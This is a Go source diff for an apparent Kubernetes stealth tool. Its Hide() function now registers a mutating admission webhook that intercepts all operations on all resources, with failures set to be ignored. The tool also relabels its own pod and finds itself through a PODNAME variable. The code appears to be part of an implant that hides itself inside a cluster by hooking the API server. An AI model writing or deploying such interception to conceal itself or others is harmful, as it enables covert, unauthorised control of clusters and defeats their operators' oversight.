@@ -24,7 +24,6 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
-	"strings"
 	"time"
 
 	"k8s.io/apimachinery/pkg/util/intstr"
@@ -59,6 +58,7 @@ type Runtime struct {
 }
 
 const (
+	EnvVarPodname     string = "PODNAME" // Note: This is set in the deploy script!
 	NamespaceLocation string = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
 	HostKubeconfig    string = "/root/.kube/config"
 )
@@ -125,6 +125,7 @@ func (r *Runtime) Hide() error {
 	r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})
 
 	// Create MutatingWebhookConfiguration
+	fail := admissionregistrationv1.Ignore
 	sideEffect := admissionregistrationv1.SideEffectClassNone
 	m := &admissionregistrationv1.MutatingWebhookConfiguration{
 		ObjectMeta: metav1.ObjectMeta{
@@ -138,23 +139,25 @@ func (r *Runtime) Hide() error {
 					URL: nil,
 					Service: &admissionregistrationv1.ServiceReference{
 						Namespace: r.Namespace(),
-						Name:      r.ServiceName(),
+						Name:      r.Identifier(),
 						Path:      &InjectionPath,
 						Port:      &DefaultAddrPort,
 					},
 					CABundle: r.caPEM.Bytes(), // Inject CA Pem for the API server here!
 				},
-				Rules:         nil,
-				FailurePolicy: nil,
-				MatchPolicy:   nil,
-				NamespaceSelector: &metav1.LabelSelector{
-					MatchLabels:      nil,
-					MatchExpressions: nil,
+				Rules: []admissionregistrationv1.RuleWithOperations{
+					{
+						Operations: []admissionregistrationv1.OperationType{
+							admissionregistrationv1.OperationAll,
+						},
+						Rule: admissionregistrationv1.Rule{
+							APIGroups:   []string{"*"},
+							APIVersions: []string{"*"},
+							Resources:   []string{"*"},
+						},
+					},
 				},
-				ObjectSelector: &metav1.LabelSelector{
-					MatchLabels:      nil,
-					MatchExpressions: nil,
-				},
+				FailurePolicy:           &fail,
 				SideEffects:             &sideEffect,
 				AdmissionReviewVersions: []string{"v1", "v1beta1"},
 			},
@@ -169,17 +172,15 @@ func (r *Runtime) Hide() error {
 	// Ensure self has labels
 	self := r.Self()
 	if self != nil {
-
 		for k, v := range r.labels {
-			logrus.Infof("Updated:        %s:%s", k, v)
+			logrus.Infof("Setting Label:        %s:%s", k, v)
 			self.Labels[k] = v
 		}
 		_, err = r.Client().CoreV1().Pods(r.Namespace()).Update(context.TODO(), self, metav1.UpdateOptions{})
 		if err != nil {
 			return fmt.Errorf("unable to update self: %v", err)
 		}
-		logrus.Infof("Updated: Self [%s.%s] labels:", self.Name, r.Namespace())
-
+		logrus.Infof("Updated: Self [%s.%s] labels", self.Name, r.Namespace())
 	} else {
 		logrus.Warnf("Unable to update self pod!")
 	}
@@ -249,17 +250,13 @@ func (r *Runtime) Open() error {
 		logrus.Warnf("Empty Environmental Variable HOSTNAME")
 	}
 	// Add labels to self
-	pods, err := r.Client().CoreV1().Pods(r.Namespace()).List(context.TODO(), metav1.ListOptions{})
+	pod, err := r.Client().CoreV1().Pods(r.Namespace()).Get(context.TODO(), os.Getenv("PODNAME"), metav1.GetOptions{})
 	if err != nil {
 		return fmt.Errorf("unable to list pods: %v", err)
 	}
-	for _, pod := range pods.Items {
-		// Match the full pod to the identifier!
-		if strings.Contains(pod.String(), r.identifier) {
-			logrus.Infof("Found self: pod.%s", pod.Name)
-			r.self = &pod
-			return nil
-		}
+	if pod != nil {
+		r.self = pod
+		logrus.Infof("Found self: %s", pod.Name)
 	}
 	logrus.Warnf("Unable to find self pod! Possibly running in local mode!")
 	return nil
